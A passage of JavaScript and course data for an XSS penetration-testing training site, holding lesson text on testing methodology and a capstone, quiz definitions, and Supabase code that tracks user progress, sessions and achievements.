                "duration": "120 min",
                "objectives": [
                    "Develop a professional, repeatable framework for testing any application for XSS",
                    "Use a combination of automated and manual testing for comprehensive coverage",
                    "Apply risk rating systems to accurately score the impact of findings"
                ],
                "content": {
                    "overview": "This lesson brings everything together into a professional methodology. You will learn how to approach any application as a professional penetration tester, combining automated and manual techniques into a repeatable process that ensures thorough coverage and high-quality results.",
                    "sections": [
                        {
                            "title": "The Hybrid Methodology",
                            "content": "<ol><li><strong>Reconnaissance:</strong> Map the application.</li><li><strong>Automated Scanning:</strong> Use a DAST tool to find all the low-hanging fruit and common reflection points.</li><li><strong>Manual Testing:</strong> Dive deep into the high-risk areas of the application. Manually test for the subtle vulnerabilities that scanners miss, like DOM XSS and business logic flaws.</li><li><strong>Exploitation:</strong> For any findings, create a safe but effective proof of concept to demonstrate the business impact.</li><li><strong>Reporting:</strong> Document all findings in a professional report.</li></ol>",
                            "image": "https://images.unsplash.com/photo-1519389950473-47ba0277781c?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "Why is a hybrid approach combining automated scanning and manual testing the most effective?", "options": ["It isn't, manual testing is all you need", "Automated scanning provides broad coverage to find common flaws, while manual testing provides the depth and intelligence needed to find complex and logic-based vulnerabilities", "Automated scanning is too expensive", "Manual testing is too slow"], "correct": 1, "explanation": "This approach uses the strengths of both methods to provide the most comprehensive assessment in a reasonable amount of time." }
                    ]
                }
            },
            {
                "id": "lesson-50-final-capstone-project",
                "title": "Lesson 50: Final Capstone Project",
                "duration": "240 min",
                "objectives": [
                    "Conduct a comprehensive XSS security assessment of a complex, multi-functional application",
                    "Chain multiple XSS vulnerabilities together to achieve a high-impact outcome",
                    "Produce a professional-grade, enterprise-ready penetration test report"
                ],
                "content": {
                    "overview": "The final capstone project is a comprehensive, master's level assessment that requires you to synthesize every skill learned in this program. You will be given access to a complex vulnerable web application. Your mission is to perform a full security assessment, find and chain multiple vulnerabilities to achieve a full account takeover, and produce a professional report suitable for a major enterprise client.",
                    "sections": [
                        {
                            "title": "The Final Assessment",
                            "content": "<p><strong>The Task:</strong> You are the lead penetration tester hired to assess a new social media platform. The platform is known to contain a variety of reflected, stored, and DOM-based XSS vulnerabilities, along with other flaws like CSRF and weak cookie configurations.</p><h3>Your Mission:</h3><ol><li><strong>Reconnaissance:</strong> Fully map the application's functionality.</li><li><strong>Identify and Chain Vulnerabilities:</strong> Your goal is to start as a new, unprivileged user, and find a way to compromise an administrator's account. This may require chaining a low-impact reflected XSS to get an anti-CSRF token, and then using that to forge a request that leads to a stored XSS payload being saved in a place only the admin will see.</li><li><strong>Reporting:</strong> Produce a single, comprehensive penetration test report that details all your findings, chains the vulnerabilities together into a narrative, and provides a prioritized, strategic remediation plan.</li></ol>",
                            "image": "https://images.unsplash.com/photo-1498050108023-c5249f4df085?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 100,
                    "questions": [
                        { "id": 1, "question": "The capstone project assesses your ability to:", "options": ["Run a single automated scan", "Answer multiple choice questions", "Think like a real-world attacker, chaining multiple vulnerabilities together to achieve a high-impact goal, and professionally document your findings", "Write a simple 'hello world' script"], "correct": 2, "explanation": "This project is the ultimate test of your practical skills, requiring you to apply your full knowledge base to solve a complex, multi-stage security engagement." }
                    ]
                }
            }
        ]
    };

      // =====================================================
      // GLOBAL VARIABLES
      // =====================================================
      let currentUser = null;
      let currentLessonIndex = 0;
      let courseProgress = {};
      let userStats = {};
      let quizState = {
        currentQuestion: 0,
        answers: [],
        score: 0,
        isComplete: false,
      };

      // Enhanced session tracking
      let courseSession = {
        startTime: null,
        totalStudyTime: 0,
        lessonsStarted: 0,
        lessonsCompleted: 0,
        pageLoadTime: new Date(),
        interactionCount: 0,
        lastActivityTime: new Date(),
      };

      // Music Player Variables
      let audioPlayer = new Audio();

      // Achievement notification system
      let notificationQueue = [];
      let isShowingNotification = false;

      // =====================================================
      // INITIALIZATION
      // =====================================================
      document.addEventListener("DOMContentLoaded", async () => {
        try {
          showLoadingScreen();
          await checkAuth();

          if (currentUser) {
            // Initialize session tracking
            startCourseSession();

            // Load course data and progress
            await loadCourseData();
            await loadUserProfile();
            await loadProgress();

            // Initialize UI
            initializeEventListeners();
            renderSidebar();
            loadLesson(currentLessonIndex);

            // Initialize additional features
            initMusicPlayer();
            addMusicIndicator();
            initializeActivityTracking();

            hideLoadingScreen();
          } else {
            openAuthModal();
          }
        } catch (error) {
          console.error("Error initializing course:", error);
          hideLoadingScreen();
          showToast("Failed to initialize course system", "error");
        }
      });

      // =====================================================
      // AUTHENTICATION SYSTEM
      // =====================================================
      async function checkAuth() {
        try {
          const {
            data: { session },
            error,
          } = await supabase.auth.getSession();

          if (error) {
            console.error("Auth error:", error);
            currentUser = null;
            openAuthModal();
            return;
          }

          if (!session) {
            currentUser = null;
            openAuthModal();
            return;
          }

          currentUser = session.user;
          updateUIWithUser();
        } catch (error) {
          console.error("Error checking auth:", error);
          currentUser = null;
          openAuthModal();
        }
      }

      function updateUIWithUser() {
        if (!currentUser) return;

        const name =
          currentUser.user_metadata?.full_name ||
          currentUser.email.split("@")[0];
        const userElements = document.querySelectorAll("[data-user-name]");
        userElements.forEach((el) => (el.textContent = name));
      }

      // =====================================================
      // USER PROFILE & STATS MANAGEMENT
      // =====================================================
      async function loadUserProfile() {
        try {
          // 🔍 Step 1: Try to fetch existing profile
          const { data: profile, error } = await supabase
            .from("profiles")
            .select("*")
            .eq("id", currentUser.id)
            .single();

          if (error && error.code !== "PGRST116") {
            throw error;
          }

          if (!profile) {
            // 🆕 Step 2: Create new profile if missing
            await createUserProfile();
          } else {
            // ✅ Step 3: Use existing profile
            userStats = profile;
            await updateLastActivity();
          }
        } catch (error) {
          console.error("❌ Error loading user profile:", error);
          showToast("Failed to load user profile", "error");
        }
      }
      async function createUserProfile() {
        try {
          const newProfile = {
            id: currentUser.id,
            full_name: currentUser.user_metadata?.full_name || "",
            email: currentUser.email,
            level: "Script Kiddie",
            total_points: 0,
            completed_courses: 0,
            current_streak: 0,
            total_certificates: 0,
            total_achievements: 0,
            sections_visited: 0,
            bonus_points: 0,
            in_progress_courses: 0,
            settings_changed: 0,
            midnight_sessions: 0,
            early_sessions: 0,
            weekend_sessions: 0,
            last_activity: new Date().toISOString(),
            created_at: new Date().toISOString(),
          };

          const { error } = await supabase
            .from("profiles")
            .insert([newProfile]);

          if (!error) {
            userStats = newProfile;
            // Award first login achievement
            setTimeout(() => checkAndUnlockAchievement("first_login"), 1000);
          }
        } catch (error) {
          console.error("Error creating user profile:", error);
        }
      }

      async function updateLastActivity() {
        try {
          const now = new Date();

          // Update activity tracking
          courseSession.lastActivityTime = now;

          // Update database
          await supabase
            .from("profiles")
            .update({
              last_activity: now.toISOString(),
            })
            .eq("id", currentUser.id);

          // Check time-based achievements
          await checkTimeBasedAchievements(now);
        } catch (error) {
          console.error("Error updating last activity:", error);
        }
      }

      // =====================================================
      // COURSE SESSION MANAGEMENT
      // =====================================================
      function startCourseSession() {
        courseSession.startTime = new Date();
        courseSession.pageLoadTime = new Date();

        logUserActivity("course_session_start", {
          course_id: COURSE_DATA.id,
          course_title: COURSE_DATA.title,
          user_agent: navigator.userAgent,
          screen_resolution: `${screen.width}x${screen.height}`,
        });

        // Check daily streak
        checkDailyStreak();
      }

      function initializeActivityTracking() {
        // Track page focus/blur for accurate study time
        document.addEventListener("visibilitychange", handleVisibilityChange);

        // Track user interactions
        ["click", "keydown", "scroll", "mousemove"].forEach((event) => {
          document.addEventListener(event, trackUserInteraction, {
            passive: true,
          });
        });

        // Periodic activity updates
        setInterval(updateStudyTime, 60000); // Every minute

        // Save session data before page unload
        window.addEventListener("beforeunload", saveSessionData);
      }

      function handleVisibilityChange() {
        if (document.hidden) {
          courseSession.lastActivityTime = new Date();
        } else {
          // Page became visible again - update activity
          updateLastActivity();
        }
      }

      function trackUserInteraction() {
        courseSession.interactionCount++;
        courseSession.lastActivityTime = new Date();

        // Throttle activity updates
        if (courseSession.interactionCount % 50 === 0) {
          updateLastActivity();
        }
      }

      function updateStudyTime() {
        if (!courseSession.startTime || document.hidden) return;

        const now = new Date();
        const sessionDuration = now - courseSession.startTime;
        courseSession.totalStudyTime = Math.floor(sessionDuration / 1000 / 60); // in minutes

        // Update progress with study time
        saveProgress();
      }

      function saveSessionData() {
        if (!currentUser || !courseSession.startTime) return;

        const sessionData = {
          user_id: currentUser.id,
          course_id: COURSE_DATA.id,
          session_duration: courseSession.totalStudyTime,
          lessons_viewed: courseSession.lessonsStarted,
          lessons_completed: courseSession.lessonsCompleted,
          interactions: courseSession.interactionCount,
          session_date: courseSession.startTime.toISOString().split("T")[0],
        };

        // Store in localStorage as backup
        localStorage.setItem(
          "course_session_backup",
          JSON.stringify(sessionData)
        );

        // Try to save to database
        logUserActivity("course_session_end", sessionData);
      }

      // =====================================================
      // COURSE DATA & PROGRESS MANAGEMENT
      // =====================================================
      async function loadCourseData() {
        try {
          // Update course info in UI
          document.getElementById("courseTitle").textContent =
            COURSE_DATA.title;
          document.getElementById("totalLessons").textContent =
            COURSE_DATA.lessons.length;

          // Log course access
          logUserActivity("course_access", {
            course_id: COURSE_DATA.id,
            course_title: COURSE_DATA.title,
          });
        } catch (error) {
          console.error("Error loading course data:", error);
        }
      }

      async function loadProgress() {
        try {
          // Get existing progress from database
          const { data, error } = await supabase
            .from("course_progress")
            .select("*")
            .eq("user_id", currentUser.id)
            .eq("course_id", COURSE_DATA.id)
            .single();

          if (error && error.code !== "PGRST116") {
            throw error;
          }

          if (data) {
            courseProgress = JSON.parse(data.lesson_progress || "{}");
            currentLessonIndex = data.current_lesson || 0;

            // Update session tracking
            courseSession.lessonsStarted = Object.keys(courseProgress).length;
            courseSession.lessonsCompleted = Object.values(
              courseProgress
            ).filter((p) => p.completed).length;
          } else {
            // Initialize new progress
            courseProgress = {};
            currentLessonIndex = 0;
            await saveProgress();

            // Award first course start achievement
            await checkAndUnlockAchievement("first_course_start");
          }

          updateProgressDisplay();
        } catch (error) {
          console.error("Error loading progress:", error);
          showToast("Failed to load progress", "error");
        }
      }

      async function saveProgress() {
        try {
          if (!currentUser) return;

          const now = new Date();
          const progressData = {
            user_id: currentUser.id,
            course_id: COURSE_DATA.id,
            course_title: COURSE_DATA.title,
            current_lesson: currentLessonIndex,
            lesson_progress: JSON.stringify(courseProgress),
            progress: calculateOverallProgress(),
            lessons_completed: getCompletedLessonsCount(),
            lessons_started: Object.keys(courseProgress).length,
            study_time_minutes: courseSession.totalStudyTime,
            last_accessed: now.toISOString(),
            updated_at: now.toISOString(),
          };

          // Upsert progress
          const { error } = await supabase
            .from("course_progress")
            .upsert([progressData]);

          if (error) throw error;

          // Update user stats
          await updateUserStats();

          updateProgressDisplay();
        } catch (error) {
          console.error("Error saving progress:", error);
          showToast("Failed to save progress", "error");
        }
      }

      async function updateUserStats() {
        try {
          // Get all course progress for this user
          const { data: allProgress, error } = await supabase
            .from("course_progress")
            .select("progress, course_id, study_time_minutes")
            .eq("user_id", currentUser.id);

          if (error) throw error;

          // Calculate stats
          const completedCourses =
            allProgress?.filter((p) => p.progress >= 100).length || 0;
          const inProgressCourses =
            allProgress?.filter((p) => p.progress > 0 && p.progress < 100)
              .length || 0;
          const totalStudyTime =
            allProgress?.reduce(
              (sum, p) => sum + (p.study_time_minutes || 0),
              0
            ) || 0;

          // Calculate points (500 per completed course + achievement points)
          const coursePoints = completedCourses * 500;
          const bonusPoints = userStats.bonus_points || 0;
          const totalPoints = coursePoints + bonusPoints;

          // Update profile
          const updateData = {
            completed_courses: completedCourses,
            in_progress_courses: inProgressCourses,
            total_points: totalPoints,
            total_study_time: totalStudyTime,
            last_activity: new Date().toISOString(),
          };

          const { error: updateError } = await supabase
            .from("profiles")
            .update(updateData)
            .eq("id", currentUser.id);

          if (updateError) throw updateError;

          // Update local stats
          Object.assign(userStats, updateData);
        } catch (error) {
          console.error("Error updating user stats:", error);
        }
      }

      function calculateOverallProgress() {
        const completedLessons = getCompletedLessonsCount();
        return Math.round(
          (completedLessons / COURSE_DATA.lessons.length) * 100
        );
      }

      function getCompletedLessonsCount() {
        return Object.values(courseProgress).filter(
          (lesson) => lesson.completed
        ).length;
      }

      function updateProgressDisplay() {
        const completedCount = getCompletedLessonsCount();
        const progressPercent = calculateOverallProgress();

        // Update UI elements
        const elements = {
          completedLessons: completedCount,
          courseProgressPercent: `${progressPercent}%`,
        };

        Object.entries(elements).forEach(([id, value]) => {
          const element = document.getElementById(id);
          if (element) element.textContent = value;
        });

        // Update progress bar
        const progressBar = document.getElementById("courseProgressFill");
        if (progressBar) progressBar.style.width = `${progressPercent}%`;
      }

      // =====================================================
      // LESSON MANAGEMENT
      // =====================================================
      function loadLesson(index) {
        if (index < 0 || index >= COURSE_DATA.lessons.length) return;

        const lesson = COURSE_DATA.lessons[index];
        currentLessonIndex = index;

        // Mark lesson as started and track activity
        if (!courseProgress[lesson.id]) {
          courseProgress[lesson.id] = {
            started: true,
            completed: false,
            startedAt: new Date().toISOString(),
            timeSpent: 0,
          };

          courseSession.lessonsStarted++;
          saveProgress();

          // Log lesson start
          logUserActivity("lesson_start", {
            lesson_id: lesson.id,
            lesson_title: lesson.title,
            lesson_index: index,
          });
        }

        // Update lesson start time for time tracking
        courseProgress[lesson.id].currentSessionStart = new Date();

        // Update sidebar and navigation
        renderSidebar();
        updateNavigationButtons();

        // Update header info
        updateLessonHeader(lesson, index);

        // Render lesson content
        renderLessonContent(lesson);

        // Smooth scroll and animations
        window.scrollTo({ top: 0, behavior: "smooth" });
        document.getElementById("contentBody").scrollTop = 0;

        const contentBody = document.getElementById("contentBody");
        contentBody.classList.add("fade-in");
        setTimeout(() => contentBody.classList.remove("fade-in"), 500);

        // Check lesson-based achievements
        checkLessonAchievements(index + 1);
      }

      function updateLessonHeader(lesson, index) {
        const elements = {
          currentLessonNumber: index + 1,
          currentLessonTitle: lesson.title,
          navInfo: `Lesson ${index + 1} of ${COURSE_DATA.lessons.length}`,
        };

        Object.entries(elements).forEach(([id, value]) => {
          const element = document.getElementById(id);
          if (element) element.textContent = value;
        });
      }

      function renderSidebar() {
        const lessonNav = document.getElementById("lessonNav");
        if (!lessonNav) return;

        lessonNav.innerHTML = "";

        COURSE_DATA.lessons.forEach((lesson, index) => {
          const lessonItem = document.createElement("div");
          lessonItem.className = "lesson-item";

          // Determine lesson status
          const lessonProgress = courseProgress[lesson.id];
          const isCompleted = lessonProgress?.completed || false;
          const isInProgress = lessonProgress?.started || false;
          const isLocked = !isCompleted && !canAccessLesson(index);
          const isActive = index === currentLessonIndex;

          // Apply status classes
          if (isCompleted) lessonItem.classList.add("completed");
          if (isLocked) lessonItem.classList.add("locked");
          if (isActive) lessonItem.classList.add("active");

          // Determine status display
          let statusClass = "not-started";
          let statusIcon = index + 1;

          if (isCompleted) {
            statusClass = "completed";
            statusIcon = "✓";
          } else if (isInProgress) {
            statusClass = "in-progress";
            statusIcon = "◐";
          }

          // Create lesson item HTML
          lessonItem.innerHTML = `
            <div class="lesson-status ${statusClass}">${statusIcon}</div>
            <div class="lesson-info">
                <div class="lesson-title">${lesson.title}</div>
                <div class="lesson-meta">
                    ${
                      isCompleted
                        ? "Completed"
                        : isInProgress
                        ? "In Progress"
                        : isLocked
                        ? "Locked"
                        : "Not Started"
                    }
                </div>
            </div>
            <div class="lesson-duration">${lesson.duration}</div>
        `;

          // Add click handler if not locked
          if (!isLocked) {
            lessonItem.addEventListener("click", () => {
              if (index !== currentLessonIndex) {
                // Track lesson time before switching
                trackLessonTime();

                currentLessonIndex = index;
                loadLesson(index);
                closeSidebar();
              }
            });
          }

          lessonNav.appendChild(lessonItem);
        });
      }

      function canAccessLesson(index) {
        if (index === 0) return true; // First lesson always accessible

        // Can access if previous lesson is completed
        const previousLessonId = COURSE_DATA.lessons[index - 1].id;
        return courseProgress[previousLessonId]?.completed || false;
      }

      function trackLessonTime() {
        const currentLesson = COURSE_DATA.lessons[currentLessonIndex];
        const lessonProgress = courseProgress[currentLesson.id];

        if (lessonProgress?.currentSessionStart) {
          const sessionTime = Math.floor(
            (new Date() - new Date(lessonProgress.currentSessionStart)) /
              1000 /
              60
          );
          lessonProgress.timeSpent =
            (lessonProgress.timeSpent || 0) + sessionTime;
          delete lessonProgress.currentSessionStart;
        }
      }

      // =====================================================
      // LESSON CONTENT RENDERING
      // =====================================================
      function renderLessonContent(lesson) {
        const contentContainer = document.getElementById("lessonContent");
        if (!contentContainer) return;

        let contentHTML = `
        <div class="content-section">
            <h2>Learning Objectives</h2>
            <ul>
                ${lesson.objectives.map((obj) => `<li>${obj}</li>`).join("")}
            </ul>
        </div>
        
        <div class="content-section">
            <h2>Overview</h2>
            <p>${lesson.content.overview}</p>
        </div>
    `;

        // Render content sections
        lesson.content.sections.forEach((section) => {
          contentHTML += `
            <div class="content-section">
                <h2>${section.title}</h2>
                ${section.content}
                ${
                  section.image
                    ? `<img src="${section.image}" alt="${section.title}" class="content-image" loading="lazy">`
                    : ""
                }
            </div>
        `;
        });

        // Render code examples
        if (
          lesson.content.codeExamples &&
          lesson.content.codeExamples.length > 0
        ) {
          contentHTML += `<div class="content-section"><h2>Code Examples</h2></div>`;

          lesson.content.codeExamples.forEach((example, index) => {
            const codeId = `code-${lesson.id}-${index}`;
            contentHTML += `
                <div class="code-section">
                    <div class="code-header">
                        <span class="code-title">${example.title}</span>
                        <button class="copy-btn" onclick="copyCode('${codeId}')">
                            <i class="fas fa-copy"></i> Copy
                        </button>
                    </div>
                    <pre class="code-block"><code id="${codeId}" class="language-${
              example.language
            }">${escapeHtml(example.code)}</code></pre>
                </div>
            `;
          });
        }

        // Render quiz
        contentHTML += renderQuiz(lesson.quiz);

        contentContainer.innerHTML = contentHTML;

        // Highlight code syntax if Prism is available
        setTimeout(() => {
          if (window.Prism) {
            Prism.highlightAll();
          }
        }, 100);
      }

      // =====================================================
      // QUIZ SYSTEM
      // =====================================================
      function renderQuiz(quiz) {
        const currentLessonProgress =
          courseProgress[COURSE_DATA.lessons[currentLessonIndex].id];
        const isCompleted = currentLessonProgress?.completed || false;

        let quizHTML = `
        <div class="quiz-section" id="quizSection">
            <div class="quiz-header">
                <h2 class="quiz-title">
                    <i class="fas fa-clipboard-check"></i>
                    Knowledge Check
                </h2>
                <p class="quiz-info">
                    Complete this quiz with ${quiz.passingScore}% or higher to unlock the next lesson.
                </p>
            </div>
    `;

        if (isCompleted) {
          const savedScore = currentLessonProgress.quizScore || 0;
          quizHTML += `
            <div class="quiz-results show">
                <div class="quiz-score pass">${savedScore}%</div>
                <div class="quiz-message">
                    <strong>Lesson Completed!</strong><br>
                    You've successfully passed this lesson's quiz.
                </div>
            </div>
        `;
        } else {
          // Render quiz questions
          quiz.questions.forEach((question, qIndex) => {
            quizHTML += `
                <div class="quiz-question ${
                  qIndex === 0 ? "active" : ""
                }" data-question="${qIndex}">
                    <div class="question-header">
                        <span class="question-number">Question ${
                          qIndex + 1
                        }</span>
                        <span class="question-progress">${qIndex + 1}/${
              quiz.questions.length
            }</span>
                    </div>
                    <div class="question-text">${question.question}</div>
                    <div class="question-options">
                        ${question.options
                          .map(
                            (option, oIndex) => `
                            <div class="option" data-option="${oIndex}" onclick="selectOption(${qIndex}, ${oIndex})">
                                <span class="option-letter">${String.fromCharCode(
                                  65 + oIndex
                                )}</span>
                                <span class="option-text">${option}</span>
                            </div>
                        `
                          )
                          .join("")}
                    </div>
                </div>
            `;
          });

          quizHTML += `
            <div class="quiz-controls">
                <button class="btn btn-secondary" id="prevQuestionBtn" onclick="previousQuestion()" disabled>
                    <i class="fas fa-chevron-left"></i>
                    Previous
                </button>
                <div>
                    <button class="btn btn-secondary" id="nextQuestionBtn" onclick="nextQuestion()" disabled>
                        Next
                        <i class="fas fa-chevron-right"></i>
                    </button>
                    <button class="btn btn-primary" id="submitQuizBtn" onclick="submitQuiz()" style="display: none;">
                        <i class="fas fa-check"></i>
                        Submit Quiz
                    </button>
                </div>
            </div>

            <div class="quiz-results" id="quizResults">
                <div class="quiz-score" id="quizScore">0%</div>
                <div class="quiz-message" id="quizMessage"></div>
                <div class="quiz-actions">
                    <button class="btn btn-primary" id="continueBtn" onclick="completeLesson()" style="display: none;">
                        <i class="fas fa-arrow-right"></i>
                        Continue to Next Lesson
                    </button>
                    <button class="btn btn-secondary" onclick="retakeQuiz()">
                        <i class="fas fa-redo"></i>
                        Retake Quiz
                    </button>
                </div>
            </div>
        `;
        }

        quizHTML += "</div>";
        return quizHTML;
      }

      // Quiz interaction functions
      function selectOption(questionIndex, optionIndex) {
        // Clear previous selections
        document
          .querySelectorAll(`[data-question="${questionIndex}"] .option`)
          .forEach((opt) => {
            opt.classList.remove("selected");
          });

        // Select current option
        const selectedOption = document.querySelector(
          `[data-question="${questionIndex}"] [data-option="${optionIndex}"]`
        );
        selectedOption.classList.add("selected");

        // Store answer
        quizState.answers[questionIndex] = optionIndex;

        // Update navigation
        const isLastQuestion =
          questionIndex ===
          COURSE_DATA.lessons[currentLessonIndex].quiz.questions.length - 1;
        if (isLastQuestion) {
          document.getElementById("submitQuizBtn").style.display =
            "inline-flex";
          document.getElementById("nextQuestionBtn").style.display = "none";
        } else {
          document.getElementById("nextQuestionBtn").disabled = false;
        }
      }

      function nextQuestion() {
        const currentQuestionEl = document.querySelector(
          ".quiz-question.active"
        );
        const nextQuestionEl = currentQuestionEl.nextElementSibling;

        if (
          nextQuestionEl &&
          nextQuestionEl.classList.contains("quiz-question")
        ) {
          currentQuestionEl.classList.remove("active");
          nextQuestionEl.classList.add("active");
          quizState.currentQuestion++;
          updateQuizNavigation();
        }
      }

      function previousQuestion() {
        const currentQuestionEl = document.querySelector(
          ".quiz-question.active"
        );
        const prevQuestionEl = currentQuestionEl.previousElementSibling;

        if (
          prevQuestionEl &&
          prevQuestionEl.classList.contains("quiz-question")
        ) {
          currentQuestionEl.classList.remove("active");
          prevQuestionEl.classList.add("active");
          quizState.currentQuestion--;
          updateQuizNavigation();
        }
      }

      function updateQuizNavigation() {
        const totalQuestions =
          COURSE_DATA.lessons[currentLessonIndex].quiz.questions.length;
        const prevBtn = document.getElementById("prevQuestionBtn");
        const nextBtn = document.getElementById("nextQuestionBtn");
        const submitBtn = document.getElementById("submitQuizBtn");

        prevBtn.disabled = quizState.currentQuestion === 0;

        const hasAnswer =
          quizState.answers[quizState.currentQuestion] !== undefined;
        const isLastQuestion = quizState.currentQuestion === totalQuestions - 1;

        if (isLastQuestion) {
          nextBtn.style.display = "none";
          submitBtn.style.display = hasAnswer ? "inline-flex" : "none";
        } else {
          nextBtn.style.display = "inline-flex";
          nextBtn.disabled = !hasAnswer;
          submitBtn.style.display = "none";
        }
      }

      async function submitQuiz() {
        const lesson = COURSE_DATA.lessons[currentLessonIndex];
        const quiz = lesson.quiz;
        let correctAnswers = 0;

        // Hide questions and controls
        document
          .querySelectorAll(".quiz-question")
          .forEach((q) => (q.style.display = "none"));
        document.querySelector(".quiz-controls").style.display = "none";

        // Calculate score and highlight answers
        quiz.questions.forEach((question, index) => {
          const userAnswer = quizState.answers[index];
          const correctAnswer = question.correct;
          const isCorrect = userAnswer === correctAnswer;

          if (isCorrect) correctAnswers++;

          // Highlight answers
          const questionEl = document.querySelector(
            `[data-question="${index}"]`
          );
          const options = questionEl.querySelectorAll(".option");

          options[correctAnswer].classList.add("correct");
          if (userAnswer !== correctAnswer && userAnswer !== undefined) {
            options[userAnswer].classList.add("incorrect");
          }
        });

        const score = Math.round(
          (correctAnswers / quiz.questions.length) * 100
        );
        const passed = score >= quiz.passingScore;

        // Update quiz results UI
        const quizScore = document.getElementById("quizScore");
        const quizMessage = document.getElementById("quizMessage");
        const quizActions = document.querySelector(".quiz-actions");

        quizScore.textContent = `${score}%`;
        quizScore.className = `quiz-score ${passed ? "pass" : "fail"}`;

        if (passed) {
          quizMessage.innerHTML = `
            <strong>Congratulations!</strong><br>
            You passed with ${score}%. You can now proceed to the next lesson.
        `;

          quizActions.innerHTML = `
            <button class="btn btn-primary" onclick="completeLesson()">
                <i class="fas fa-arrow-right"></i>
                Continue to Next Lesson
            </button>
        `;

          // Mark lesson as completed
          await markLessonComplete(score);
        } else {
          quizMessage.innerHTML = `
            <strong>Not quite there yet.</strong><br>
            You scored ${score}%. You need ${quiz.passingScore}% to pass. Review the material and try again.
        `;

          quizActions.innerHTML = `
            <button class="btn btn-secondary" onclick="retakeQuiz()">
                <i class="fas fa-redo"></i>
                Retake Quiz
            </button>
        `;
        }

        document.getElementById("quizResults").classList.add("show");

        // Log quiz completion
        logUserActivity("quiz_completed", {
          lesson_id: lesson.id,
          lesson_title: lesson.title,
          score: score,
          passed: passed,
          attempts: (courseProgress[lesson.id]?.quizAttempts || 0) + 1,
        });

        // Scroll to results
        document
          .getElementById("quizResults")
          .scrollIntoView({ behavior: "smooth" });
      }

      function retakeQuiz() {
        // Reset quiz state
        quizState = {
          currentQuestion: 0,
          answers: [],
          score: 0,
          isComplete: false,
        };

        // Track quiz retry
        const lessonId = COURSE_DATA.lessons[currentLessonIndex].id;
        if (!courseProgress[lessonId]) courseProgress[lessonId] = {};
        courseProgress[lessonId].quizAttempts =
          (courseProgress[lessonId].quizAttempts || 0) + 1;

        // Reload lesson content
        loadLesson(currentLessonIndex);

        // Scroll to quiz
        setTimeout(() => {
          document
            .getElementById("quizSection")
            .scrollIntoView({ behavior: "smooth" });
        }, 500);
      }

      async function markLessonComplete(score) {
        const lesson = COURSE_DATA.lessons[currentLessonIndex];
        const lessonId = lesson.id;

        // Track lesson completion time
        trackLessonTime();

        // Update lesson progress
        courseProgress[lessonId] = {
          ...courseProgress[lessonId],
          completed: true,
          quizScore: score,
          completedAt: new Date().toISOString(),
          finalScore: score,
        };

        // Update session tracking
        courseSession.lessonsCompleted++;

        // Save progress to database
        await saveProgress();

        // Update UI
        renderSidebar();
        updateNavigationButtons();

        // Check various achievements
        await checkLessonCompletionAchievements();
        await checkPerfectScoreAchievements(score);
        await checkStudyTimeAchievements();

        // Log lesson completion
        logUserActivity("lesson_completed", {
          lesson_id: lessonId,
          lesson_title: lesson.title,
          final_score: score,
          time_spent: courseProgress[lessonId].timeSpent || 0,
          lesson_number: currentLessonIndex + 1,
        });

        showToast("Lesson completed successfully!", "success");
      }

      async function completeLesson() {
        if (currentLessonIndex < COURSE_DATA.lessons.length - 1) {
          // Move to next lesson
          currentLessonIndex++;
          loadLesson(currentLessonIndex);
        } else {
          // Course completion
          await completeCourse();
        }
      }

      async function completeCourse() {
        try {
          const completionTime = courseSession.totalStudyTime;

          // Update course progress to 100% completed
          await supabase
            .from("course_progress")
            .update({
              progress: 100,
              completed_at: new Date().toISOString(),
              completion_time_minutes: completionTime,
            })
            .eq("user_id", currentUser.id)
            .eq("course_id", COURSE_DATA.id);

          // Award course completion achievements
          await checkAndUnlockAchievement("course_completion_1");
          await checkSpeedCompletionAchievements(completionTime);
          await checkCourseStreakAchievements();

          // Update user stats
          await updateUserStats();

          // Show completion message
          showToast(
            "Congratulations! Course completed successfully!",
            "certificate"
          );

          // Log course completion
          logUserActivity("course_completed", {
            course_id: COURSE_DATA.id,
            course_title: COURSE_DATA.title,
            completion_time_minutes: completionTime,
            total_lessons: COURSE_DATA.lessons.length,
            average_quiz_score: calculateAverageQuizScore(),
          });

          // Redirect to dashboard after delay
          setTimeout(() => {
            window.location.href = "/dashboard.html";
          }, 3000);
        } catch (error) {
          console.error("Error completing course:", error);
          showToast("Error marking course as complete", "error");
        }
      }

      // =====================================================
      // ACHIEVEMENT INTEGRATION SYSTEM
      // =====================================================
      async function checkAndUnlockAchievement(
        achievementId,
        skipNotification = false
      ) {
        try {
          // Prevent duplicate checks
          const cacheKey = `achievement_${achievementId}_${currentUser.id}`;
          if (sessionStorage.getItem(cacheKey)) return false;

          // Check if already unlocked
          const { data: existing, error } = await supabase
            .from("user_achievements")
            .select("id")
            .eq("user_id", currentUser.id)
            .eq("achievement_id", achievementId)
            .single();

          if (existing) {
            sessionStorage.setItem(cacheKey, "true");
            return false;
          }

          // Award achievement
          const achievementData = {
            user_id: currentUser.id,
            achievement_id: achievementId,
            unlocked_at: new Date().toISOString(),
            points_awarded: getAchievementPoints(achievementId),
            context: "course_system",
          };

          const { data, error: insertError } = await supabase
            .from("user_achievements")
            .insert([achievementData])
            .select()
            .single();

          if (insertError) {
            if (insertError.code === "23505") return false; // Already exists
            throw insertError;
          }

          // Update user points
         await supabase.rpc('increment_user_stats', {
  user_id_param: currentUser.id,
  points_to_add: achievementData.points_awarded,
  achievements_to_add: 1
});

          // Cache and queue notification
          sessionStorage.setItem(cacheKey, "true");

          if (!skipNotification) {
            queueAchievementNotification({
              id: achievementId,
              name: getAchievementName(achievementId),
              description: getAchievementDescription(achievementId),
              points: achievementData.points_awarded,
              rarity: getAchievementRarity(achievementId),
              icon: getAchievementIcon(achievementId),
            });
          }

          return true;
        } catch (error) {
          console.error("Error unlocking achievement:", error);
          return false;
        }
      }

      // Helper functions for achievement data (replace with your actual achievement definitions)
      function getAchievementPoints(id) {
        const pointsMap = {
          first_course_start: 75,
          first_lesson: 100,
          course_completion_1: 500,
          perfect_score: 250,
          speed_demon: 750,
          marathon_learner: 500,
          night_owl: 200,
          early_bird: 200,
          weekend_warrior: 150,
          // Add more as needed
        };
        return pointsMap[id] || 100;
      }

      function getAchievementName(id) {
        const nameMap = {
          first_course_start: "Learning Initiated",
          first_lesson: "First Steps",
          course_completion_1: "Course Conqueror",
          perfect_score: "Perfectionist",
          speed_demon: "Speed Demon",
          // Add more as needed
        };
        return nameMap[id] || "Achievement Unlocked";
      }

      function getAchievementDescription(id) {
        const descMap = {
